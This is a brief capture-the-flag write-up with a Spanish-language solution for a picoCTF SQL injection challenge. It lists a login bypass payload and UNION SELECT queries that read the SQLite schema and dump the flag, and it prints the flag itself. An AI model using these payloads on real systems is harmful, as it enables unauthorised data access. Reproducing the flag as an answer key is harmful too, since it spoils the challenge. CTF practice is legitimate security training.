Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Hints:
- SQLiLite


## Solución
Primero hay que ingresar con `' OR 1=1;--`. Luego en el campo de búsqueda, hacer `UNION SELECT 1, 2, sql FROM sqlite_master;--`
Luego `UNION SELECT 1, 2, flag FROM more_table;--`

`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}`